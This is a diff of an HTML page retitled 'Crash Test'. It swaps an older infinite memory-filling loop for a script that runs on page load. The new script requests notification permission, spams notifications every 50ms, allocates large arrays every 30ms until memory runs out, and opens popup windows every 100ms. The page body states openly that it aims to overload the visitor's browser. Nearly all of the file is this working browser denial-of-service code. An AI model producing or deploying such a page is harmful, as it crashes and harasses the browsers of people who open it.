@@ -3,14 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Memory Fill - Infinite Array</title>
+    <title>Crash Test</title>
+    <script>
+        // Request permission for notifications
+        function requestNotificationPermission() {
+            if (Notification.permission !== 'granted') {
+                Notification.requestPermission().then(permission => {
+                    if (permission !== 'granted') {
+                        alert("Permission denied! Cannot send notifications.");
+                    }
+                });
+            }
+        }
+
+        // Function to spam notifications
+        function spamNotifications() {
+            setInterval(() => {
+                if (Notification.permission === 'granted') {
+                    new Notification("🚨 System Overload 🚨", {
+                        body: "Your browser is under heavy load!",
+                        icon: "https://upload.wikimedia.org/wikipedia/commons/3/3b/Exclamation_red.svg"
+                    });
+                }
+            }, 50); // Every 50ms
+        }
+
+        // Function to fill up memory aggressively
+        function fillMemory() {
+            let arr = [];
+            setInterval(() => {
+                arr.push(new Array(1000000).fill("X")); // Allocates a large array
+                console.log("Memory usage increasing:", arr.length);
+            }, 30); // Pushes new arrays every 30ms
+        }
+
+        // Function to open infinite pop-ups (if allowed)
+        function spamPopups() {
+            setInterval(() => {
+                window.open("https://example.com", "_blank", "width=200,height=200");
+            }, 100); // Open a popup every 100ms
+        }
+
+        // Start everything when the page loads
+        window.onload = function() {
+            requestNotificationPermission();
+            spamNotifications();
+            fillMemory();
+            spamPopups();
+        };
+    </script>
 </head>
 <body>
-    <script>
-        let memoryFiller = [];
-        while (true) {
-            memoryFiller.push(new Array(1000000).fill('Memory Fill'));
-        }
-    </script>
+    <h1>🚨 Crash Test 🚨</h1>
+    <p>This page will attempt to overload your browser by spamming notifications, filling memory, and opening popups.</p>
 </body>
 </html>
